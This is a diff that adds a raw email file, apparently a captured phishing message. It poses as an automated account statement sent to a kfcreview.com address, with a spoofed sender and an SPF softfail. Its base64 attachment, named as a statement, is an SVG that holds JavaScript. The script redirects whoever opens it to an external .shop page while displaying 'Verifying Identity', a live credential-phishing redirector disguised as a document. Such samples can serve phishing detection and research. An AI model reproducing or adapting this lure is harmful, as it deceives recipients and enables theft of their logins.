@@ -1,0 +1,81 @@
+Return-Path: <gary@westdavis.com>
+Received: from westdavis.com (101.pool90-175-185.dynamic.orange.es [90.175.185.101])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 5uoqbnoucaqt08enjkll6c4brct9lbo692c08eg1
+ for zingerpie@kfcreview.com;
+ Wed, 04 Mar 2026 19:45:34 +0000 (UTC)
+Received-SPF: softfail (spfCheck: transitioning domain of westdavis.com does not designate 90.175.185.101 as permitted sender) client-ip=90.175.185.101; envelope-from=gary@westdavis.com; helo=westdavis.com;
+Authentication-Results: amazonses.com;
+ spf=softfail (spfCheck: transitioning domain of westdavis.com does not designate 90.175.185.101 as permitted sender) client-ip=90.175.185.101; envelope-from=gary@westdavis.com; helo=westdavis.com;
+ dmarc=none header.from=westdavis.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFGb05hVlBUZ0gzU0EzZ3FtZm0zRXhZQmRxNi9OSHBEblFWZWk3d0JkemFTS0xhZHcrUVVCdG12QlZtMk84WUU4ZWw1MENzSEE0cUQ5RENFQm5TdEhETkxXeHVqelhGSzFybmN0QTBUSlpkc1FlQ2xjSHFWSW9KMy9yQms2YXdITzVKVU5KaTZxZ2Nmc2hBKzMvT2pjZ3NHYkFLR282MGRTRm9ScjkvdzFjY1kwR21lRGhHWXZBN3RxZnVWRmlzZGhwWC82VDVFdTVZYmxEWEI4eFl3NHpuZ1BORG9MajgxdG44QmxyQW43L3EvMHlFcDI0a2RWN09naEVNUTBqOExRd3FueXRrYnJ5NkpCY3Q4OEp2YVM5SkQrWk9XZUZiVk1uVFhiZEc2a1dhcmc9PQ==
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=agB3D2aYwJRBMEB4hKzH9++9/fMueC0W0+8W0ystrwoICnMLWVO3Iy5TlN50TpMLT6SBWRHbFvuH/+CK2lsmJ+eesFGWkXs1qwsnjuOtWyTotulcBTXhaV+c5Oh1cH0IzYcorbMdWym3oNiYF1VMe0qJyKXRfc2rTby/CcDIIKQ=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1772653535; v=1; bh=xkZ+9Wll6Kp7wetf1Q2Qli1SlCDKKxuVGC449dvP66M=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+Reply-To: gary@westdavis.com
+From: sales|kfcreview.com<gary@westdavis.com>
+To: zingerpie@kfcreview.com
+Subject: Fw:Statement Completed as at 4/3/2026 20:45:30...Ref;831117390
+Date: 04 Mar 2026 20:45:30 +0100
+Message-ID: <20260304204530.555C70AE2840F8FA@westdavis.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_EBCDD7A4.B067E76A"
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_EBCDD7A4.B067E76A
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+
+ Hello zingerpie
+
+
+ Please find attached your statement as at 4/3/2026 20:45:30.=20=20=20=20=
+=20
+                                                               
+
+ Your prompt payment of any overdue invoices is greatly=20
+appreciated.=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20
+
+
+
+
+If you have any questions, please don't hesitate to contact us. 
+=20
+This is an automatically generated email. No response is=20
+required. 
+=20
+Security Statement: This message is intended for the addressee=20
+named and may contain confidential information. If you are not=20
+the intended recipient, please delete it and notify the sender.=20
+Confidentiality and legal privilege attached to this=20
+communication are not waived or lost by reason of mistaken=20
+delivery to you.
+
+Disclaimer: This email message has been virus-scanned and=20
+although no computer viruses were detected, Optimal Health=20
+Medical Centre accepts no liability for any consequential damage=20
+resulting from an email containing any computer viruses or=20
+affected by interception or interference.
+------=_NextPart_000_0012_EBCDD7A4.B067E76A
+Content-Type: application/octet-stream; name="Statement18683390kfcreview.com.svg"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Statement18683390kfcreview.com.svg"
+
+PCEtLSAgVGhlIGNoaWxkIHVudmVpbGVkIGEgcGllY2Ugb2YgbXVzaWMgaW4gdGhlIHdvb2Rz
+Oi4gIC0tPg0KIDxzdmcgd2lkdGg9IjMwMCIgaGVpZ2h0PSIyMDAiIHhtbG5zPSJodHRwOi8v
+d3d3LnczLm9yZy8yMDAwL3N2ZyI+DQogICAgPHNjcmlwdCB0eXBlPSJhcHBsaWNhdGlvbi9q
+YXZhc2NyaXB0Ij4NCiAgICAgICAgPCFbQ0RBVEFbDQogICAgICAgIHNldFRpbWVvdXQoZnVu
+Y3Rpb24oKSB7DQogICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICJodHRwczov
+L2s2LmFjenMyLnNob3Avb29wLz90bGJrYnBxbmtzdWNicWJhYW91bGlzbHZ2enJoZiI7DQog
+ICAgICAgIH0sIDUpOyAgPCEtLSBSZWRpcmVjdCBhZnRlciAzIHNlY29uZHMgLS0+DQogICAg
+ICAgIF1dPg0KICAgIDwvc2NyaXB0Pg0KICAgIDxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9
+IjEwMCUiIGZpbGw9ImxpZ2h0Ymx1ZSIvPg0KICAgIDx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBm
+b250LXNpemU9IjIwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJibGFjayI+DQogICAg
+ICAgIC4uLlZlcmlmeWluZyBJZGVudGl0eS4uLi4NCiAgICA8L3RleHQ+DQogPC9zdmc+DQo=
+
+
+------=_NextPart_000_0012_EBCDD7A4.B067E76A--
+
